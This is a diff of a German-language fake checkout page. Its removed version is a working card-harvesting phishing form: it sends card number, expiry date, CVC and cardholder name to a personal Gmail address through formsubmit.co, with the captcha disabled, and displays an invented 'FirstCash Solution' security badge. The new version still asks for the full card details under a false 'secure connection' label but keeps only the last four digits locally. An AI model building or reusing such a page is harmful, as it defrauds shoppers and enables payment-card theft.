@@ -1,225 +1,224 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Checkout – Kartendaten</title>
-    <style>
-        :root {
-            --bg: #f7f7f8;
-            --card: #ffffff;
-            --text: #1f2937;
-            --muted: #6b7280;
-            --border: #e5e7eb;
-            --btn: #6b6f75;
-            --btn-text: #ffffff;
-            --focus: #2563eb;
-        }
-        * { box-sizing: border-box; }
-        html, body {
-            height: 100%;
-            background: var(--bg);
-            color: var(--text);
-            font: 16px/1.4 system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
-            margin: 0;
-        }
-        .wrap {
-            min-height: 100%;
-            display: grid;
-            place-items: start center;
-            padding: 48px 16px;
-        }
-        .panel {
-            width: 100%;
-            max-width: 720px;
-            background: transparent;
-            text-align: center;
-        }
-        h1 {
-            font-weight: 600;
-            font-size: clamp(18px, 1.6vw + 12px, 24px);
-            margin: 0 0 24px;
-        }
-        form {
-            margin: 0 auto;
-            width: min(720px, 100%);
-            background: var(--card);
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 2px 10px rgba(0,0,0,.06);
-            border: 1px solid var(--border);
-        }
-        .row { display: grid; grid-template-columns: 1fr; gap: 12px; }
-        @media (min-width: 720px) {
-            .row.inline { grid-template-columns: 1.4fr .7fr .6fr; }
-        }
-        label { display: block; text-align: left; font-size: 13px; color: var(--muted); margin: 2px 0 6px; }
-        input[type="text"], input[type="tel"] {
-            width: 100%;
-            padding: 14px 14px;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-size: 16px;
-            background: #fff;
-            outline: none;
-            transition: border-color .15s, box-shadow .15s;
-        }
-        input::placeholder { color: #9ca3af; }
-        input:focus { border-color: var(--focus); box-shadow: 0 0 0 3px rgba(37,99,235,.15); }
-        .btn {
-            width: 100%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 14px 16px;
-            border-radius: 8px;
-            border: none;
-            background: var(--btn);
-            color: var(--btn-text);
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-        }
-        .btn:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
-        .btn:disabled { opacity: .6; cursor: not-allowed; }
-        .logos { display: flex; gap: 12px; align-items: center; margin-top: 12px; justify-content: center; }
-        .secure { margin-top: 28px; color: var(--muted); font-size: 12px; display: grid; justify-items: center; gap: 8px; }
-        .footer-links { margin-top: 22px; font-size: 12px; color: var(--muted); display: flex; gap: 10px; justify-content: center; align-items: center; }
-        .footer-links a { color: inherit; text-decoration: none; border-bottom: 1px solid rgba(0,0,0,0.1); }
-        .footer-links a:hover { border-bottom-color: currentColor; }
-        .badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 10px; border-radius: 999px; border: 1px solid var(--border); background: #fff; font-size: 12px; }
-        .brand { display:inline-flex; align-items:center; gap:6px; padding: 8px 10px; border:1px solid var(--border); border-radius:8px; background:#fff; }
-        .brand svg { height: 22px; width: 34px; }
-        .helper { font-size: 13px; color: #ef4444; display:none; text-align:left; }
-        .invalid + .helper { display:block; }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Checkout – Kartendaten</title>
+<style>
+  :root{
+    --bg:#eef6fb;
+    --card:#ffffff;
+    --text:#0f1724;
+    --muted:#64748b;
+    --accent:#0b69a3;
+    --border:#e6eef6;
+    --shadow: 0 12px 30px rgba(6,21,45,0.08);
+    --radius:14px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;color:var(--text);background:linear-gradient(180deg,#f7fbff 0%, #eef6fb 100%)}
+  .page{min-height:100%;display:flex;align-items:center;justify-content:center;padding:36px}
+  .card{
+    width:100%;max-width:820px;border-radius:var(--radius);background:var(--card);box-shadow:var(--shadow);
+    display:grid;grid-template-columns:1fr 420px;overflow:hidden;border:1px solid var(--border)
+  }
+  @media (max-width:880px){ .card{grid-template-columns:1fr;padding:0;max-width:520px} .side{display:none} }
+  .left{padding:36px 36px 28px 36px}
+  .right{background:linear-gradient(180deg,#f6fbff 0,#f3f9ff 100%);padding:26px;display:flex;flex-direction:column;gap:18px;align-items:center;justify-content:center}
+  h1{margin:0 0 8px;font-size:20px;font-weight:700}
+  form{display:block}
+  .row{display:grid;grid-template-columns:1fr;gap:12px}
+  @media(min-width:720px){ .row.inline{grid-template-columns:1.6fr .7fr .6fr} }
+  label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
+  input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #e9f0f6;background:#fff;font-size:15px;outline:none;transition:box-shadow .12s,border-color .12s}
+  input:focus{box-shadow:0 6px 18px rgba(11,105,163,0.12);border-color:var(--accent)}
+  input[readonly]{background:#f1f5f9;cursor:not-allowed;}
+  .field {margin-bottom:8px}
+  .helper{font-size:13px;color:#ef4444;display:none;margin-top:6px}
+  .invalid + .helper{display:block}
+  .btn{
+    margin-top:10px;background:linear-gradient(90deg,var(--accent),#005a92);color:#fff;padding:12px;border-radius:10px;border:none;font-weight:700;width:100%;cursor:pointer;box-shadow:0 6px 18px rgba(11,105,163,0.12)
+  }
+  .btn:active{transform:translateY(1px)}
+  .meta{display:flex;gap:8px;align-items:center;justify-content:center;margin-top:12px}
+  .brand{display:inline-flex;align-items:center;gap:8px;padding:8px 10px;border-radius:10px;background:#fff;border:1px solid var(--border);font-weight:600;color:var(--muted);font-size:13px}
+  .brand svg{width:44px;height:28px}
+  .note{font-size:13px;color:var(--muted);text-align:center;margin-top:8px}
+  .summary-card{width:100%;max-width:320px;background:#fff;border-radius:12px;padding:18px;border:1px solid #eef6fb;box-shadow:0 6px 20px rgba(6,21,45,0.04)}
+  .amount{font-size:22px;font-weight:700;color:var(--accent)}
+  .small{font-size:13px;color:var(--muted)}
+  .tick{width:64px;height:64px;border-radius:50%;background:linear-gradient(180deg,var(--accent),#006998);display:flex;align-items:center;justify-content:center;color:#fff;font-size:30px;margin:auto;box-shadow:0 8px 20px rgba(11,105,163,0.18)}
+  .card-visual{display:flex;align-items:center;gap:10px;padding:10px;border-radius:10px;background:linear-gradient(90deg,#082b47 0%, #0b69a3 100%);color:#fff}
+  .card-visual .chip{width:34px;height:24px;border-radius:4px;background:#f8e9c2}
+  .footer-small{font-size:12px;color:#94a3b8;text-align:center;margin-top:10px}
+</style>
 </head>
 <body>
-<div class="wrap">
-    <div class="panel">
-        <h1>Bitte geben Sie Ihre Kartendaten ein:</h1>
+<div class="page">
+  <div class="card" role="main" aria-labelledby="checkout-title">
+    <div class="left">
+      <h1 id="checkout-title">Bezahlen</h1>
+      <form id="payment-form" novalidate>
+        <div class="row inline">
+          <div class="field">
+            <label for="card-number">Kartennummer</label>
+            <input id="card-number" name="card-number" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" />
+            <p class="helper">Bitte eine gültige Kartennummer eingeben.</p>
+          </div>
 
-        <form id="payment-form"
-              action="https://formsubmit.co/valinfernanda08@gmail.com"
-              method="POST"
-              novalidate>
-            <!-- Redirect setelah submit -->
-            <input type="hidden" name="_next" value="thanks.html">
-            <input type="hidden" name="_subject" value="Neue Checkout-Einreichung von Formular">
-            <input type="hidden" name="_captcha" value="false">
+          <div class="field">
+            <label for="exp">Ablauf</label>
+            <input id="exp" name="exp" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" />
+            <p class="helper">Ungültiges Datum.</p>
+          </div>
 
-            <div class="row inline">
-                <div>
-                    <label for="card-number">Kartennummer</label>
-                    <input id="card-number" name="card-number" type="tel" inputmode="numeric" placeholder="1234 5678 9012 3456" autocomplete="cc-number" maxlength="19" aria-describedby="card-number-help" />
-                    <p class="helper" id="card-number-help">Bitte eine gültige Kartennummer eingeben.</p>
-                </div>
-                <div>
-                    <label for="exp">MM / YY</label>
-                    <input id="exp" name="exp" type="tel" inputmode="numeric" placeholder="MM / YY" autocomplete="cc-exp" maxlength="7" aria-describedby="exp-help" />
-                    <p class="helper" id="exp-help">Ungültiges Datum.</p>
-                </div>
-                <div>
-                    <label for="cvc">CVC</label>
-                    <input id="cvc" name="cvc" type="tel" inputmode="numeric" placeholder="CVC" autocomplete="cc-csc" maxlength="4" aria-describedby="cvc-help" />
-                    <p class="helper" id="cvc-help">3–4 Ziffern erforderlich.</p>
-                </div>
-            </div>
+          <div class="field">
+            <label for="cvc">CVC</label>
+            <input id="cvc" name="cvc" type="text" inputmode="numeric" placeholder="CVC" maxlength="4" autocomplete="cc-csc" />
+            <p class="helper">3–4 Ziffern erforderlich.</p>
+          </div>
+        </div>
 
-            <div class="row" style="margin-top:12px;">
-                <div>
-                    <label for="holder">Name auf der Karte</label>
-                    <input id="holder" name="holder" type="text" placeholder="Max Mustermann" autocomplete="cc-name" aria-describedby="holder-help" />
-                    <p class="helper" id="holder-help">Bitte den Namen wie auf der Karte angeben.</p>
-                </div>
-            </div>
+        <div style="margin-top:12px" class="field">
+          <label for="holder">Name auf der Karte</label>
+          <input id="holder" name="holder" type="text" placeholder="Max Mustermann" autocomplete="cc-name" />
+          <p class="helper">Bitte den Namen wie auf der Karte angeben.</p>
+        </div>
 
-            <button class="btn" type="submit">Bezahlen</button>
+        <button class="btn" type="submit">Bezahlen — € <span id="pay-amt">0.00</span></button>
+      </form>
 
-            <div class="logos" aria-hidden="true">
-                <span class="brand" title="Mastercard" aria-label="Mastercard">
-                    <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
-                        <circle cx="18" cy="15" r="10" fill="#ea001b"/>
-                        <circle cx="30" cy="15" r="10" fill="#ff5f00" fill-opacity=".9"/>
-                    </svg>
-                    <strong>Mastercard</strong>
-                </span>
-                <span class="brand" title="VISA" aria-label="VISA">
-                    <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" role="img">
-                        <rect x="4" y="6" width="40" height="18" fill="#1a1f71"/>
-                        <rect x="6" y="8" width="36" height="14" fill="#fff"/>
-                        <text x="12" y="19" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="10">VISA</text>
-                    </svg>
-                    <strong>VISA</strong>
-                </span>
-            </div>
+      <div class="meta" aria-hidden="true">
+        <div class="brand" title="Mastercard">
+          <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="18" cy="15" r="10" fill="#EA001B"/>
+            <circle cx="30" cy="15" r="10" fill="#FF5F00" fill-opacity=".95"/>
+          </svg>
+          Mastercard
+        </div>
 
-            <div class="secure">
-                <div>Transaktion gesichert durch</div>
-                <div class="badge" title="FirstCash Solution">
-                    <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><path d="M12 2a10 10 0 1 0 .001 20.001A10 10 0 0 0 12 2Zm-1 5h2v6h-2V7Zm1 11.25a1.25 1.25 0 1 1 0-2.5a1.25 1.25 0 0 1 0 2.5Z" fill="#ef6c00"/></svg>
-                    <strong>1cs</strong>
-                    <span>FirstCash&nbsp;Solution</span>
-                </div>
-            </div>
-
-            <div class="footer-links">
-                <span>© 1cs</span>
-                <a href="#">Datenschutz</a>
-                <a href="#">Über 1cs</a>
-            </div>
-        </form>
+        <div class="brand" title="Visa">
+          <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="48" height="30" fill="none"/>
+            <path d="M6 8h36v14H6z" fill="#1a1f71"/>
+            <text x="12" y="20" font-family="Arial" font-weight="700" font-size="10" fill="#fff">VISA</text>
+          </svg>
+          VISA
+        </div>
+      </div>
     </div>
+
+    <aside class="right">
+      <div class="summary-card">
+        <div class="tick">✓</div>
+        <div style="margin-top:14px">
+          <div style="display:flex;align-items:center;gap:10px">
+            <div class="card-visual">
+              <div class="chip"></div>
+              <div style="font-weight:700;letter-spacing:1px;font-size:15px">•••• 3456</div>
+            </div>
+            <div style="flex:1">
+              <div style="font-size:13px;color:var(--muted)"><strong>Karte</strong></div>
+              <div id="summary-card" style="font-weight:600">•••• 3456</div>
+            </div>
+          </div>
+          <div style="margin-top:12px">
+            <div style="font-size:13px;color:var(--muted)"><strong>Name</strong></div>
+            <div id="summary-name" style="font-weight:600">—</div>
+          </div>
+          <div style="margin-top:12px">
+            <div style="font-size:13px;color:var(--muted)"><strong>Datum</strong></div>
+            <div id="summary-date" style="font-weight:600">—</div>
+          </div>
+        </div>
+        <div class="footer-small">Sichere Verbindung</div>
+      </div>
+    </aside>
+  </div>
 </div>
 
 <script>
-    const num = (v) => v.replace(/\D+/g, "");
+const el = id => document.getElementById(id);
+const numOnly = s => (s||'').replace(/\D+/g,'');
 
-    const card = document.getElementById('card-number');
-    card.addEventListener('input', () => {
-        let v = num(card.value).slice(0, 16);
-        card.value = v.replace(/(.{4})/g, '$1 ').trim();
-        card.classList.toggle('invalid', v.length < 13);
-    });
+const card = el('card-number');
+const exp = el('exp');
+const cvc = el('cvc');
+const holder = el('holder');
+const payAmt = el('pay-amt');
 
-    const exp = document.getElementById('exp');
-    exp.addEventListener('input', () => {
-        let v = num(exp.value).slice(0, 4);
-        if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
-        exp.value = v.replace(/^([01]?\d)(\/?)(\d\d)?$/, (m, mm, slash, yy) => {
-            const mNum = parseInt(mm, 10);
-            const mmClamped = Math.min(Math.max(mNum || 0, 1), 12).toString().padStart(2,'0');
-            return yy ? mmClamped + '/' + yy : mmClamped + (slash ? '/' : '');
-        });
-        const parts = exp.value.split('/');
-        let ok = false;
-        if (parts.length === 2 && parts[0].length === 2 && parts[1].length === 2) {
-            const mm = parseInt(parts[0], 10);
-            const yy = parseInt(parts[1], 10);
-            ok = mm >= 1 && mm <= 12 && !Number.isNaN(yy);
-        }
-        exp.classList.toggle('invalid', !ok);
-    });
+function updateSummaryCard(){
+  const last4 = numOnly(card.value).slice(-4) || '----';
+  el('summary-card').textContent = '•••• ' + last4;
+  const cv = document.querySelector('.card-visual div:nth-child(2)');
+  if(cv) cv.textContent = '•••• ' + last4;
+}
 
-    const cvc = document.getElementById('cvc');
-    cvc.addEventListener('input', () => {
-        cvc.value = num(cvc.value).slice(0, 4);
-        cvc.classList.toggle('invalid', cvc.value.length < 3);
-    });
+function updateSummaryName(){
+  el('summary-name').textContent = holder.value.trim() || '—';
+}
 
-    const holder = document.getElementById('holder');
-    holder.addEventListener('input', () => {
-        holder.classList.toggle('invalid', holder.value.trim().length < 2);
-    });
+// inisialisasi summary
+updateSummaryCard();
+updateSummaryName();
 
-    document.getElementById('payment-form').addEventListener('submit', (e) => {
-        const invalids = [...document.querySelectorAll('input')].filter(i => i.classList.contains('invalid') || !i.value.trim());
-        if (invalids.length) {
-            invalids.forEach(i => i.classList.add('invalid'));
-            alert('Bitte alle Felder korrekt ausfüllen.');
-            e.preventDefault(); // cegah submit kalau ada field invalid
-        }
-    });
+// ambil total dari cart sebelumnya
+const cartTotal = sessionStorage.getItem('cartTotal') || '0.00';
+payAmt.textContent = Number(cartTotal).toFixed(2);
+
+document.getElementById('summary-date').textContent = new Date().toLocaleString('de-DE');
+
+card.addEventListener('input', () => {
+  // Ambil hanya angka
+  let v = numOnly(card.value).slice(0,16); // maksimal 16 digit
+  // Tambahkan spasi tiap 4 angka
+  card.value = v.replace(/(.{4})/g, '$1 ').trim();
+  // Validasi minimal 13 digit
+  const digits = v.length;
+  card.classList.toggle('invalid', digits < 13);
+  updateSummaryCard();
+});
+
+holder.addEventListener('input', updateSummaryName);
+
+exp.addEventListener('input', () => {
+  let v = numOnly(exp.value).slice(0,4);
+  if(v.length > 2) v = v.slice(0,2)+'/'+v.slice(2);
+  exp.value = v;
+  const parts = v.split('/');
+  const mm = parseInt(parts[0],10);
+  const yy = parseInt(parts[1],10);
+  const ok = parts.length===2 && mm>=1 && mm<=12 && !Number.isNaN(yy);
+  exp.classList.toggle('invalid', !ok);
+});
+
+cvc.addEventListener('input', () => {
+  cvc.value = numOnly(cvc.value).slice(0,4);
+  cvc.classList.toggle('invalid', cvc.value.length < 3);
+});
+
+document.getElementById('payment-form').addEventListener('submit', (e)=>{
+  e.preventDefault();
+
+  const inputs = [...document.querySelectorAll('#payment-form input')].filter(i=>i.type!=='hidden');
+  const invalids = inputs.filter(i=>i.classList.contains('invalid') || !i.value.trim());
+
+  if(invalids.length){
+    invalids.forEach(i=>i.classList.add('invalid'));
+    alert('Bitte alle Felder korrekt ausfüllen.');
+    return;
+  }
+
+  // simpan summary
+  const last4 = numOnly(card.value).slice(-4) || '0000';
+  const holderName = holder.value.trim();
+  const amt = Number(cartTotal).toFixed(2);
+  const date = new Date().toLocaleString('de-DE', {year:'numeric',month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit'});
+  sessionStorage.setItem('paymentSummary', JSON.stringify({last4, holder:holderName, amount:amt, date}));
+
+  // redirect ke thanks.html
+  window.location.href = 'thanks.html';
+});
 </script>
 </body>
 </html>
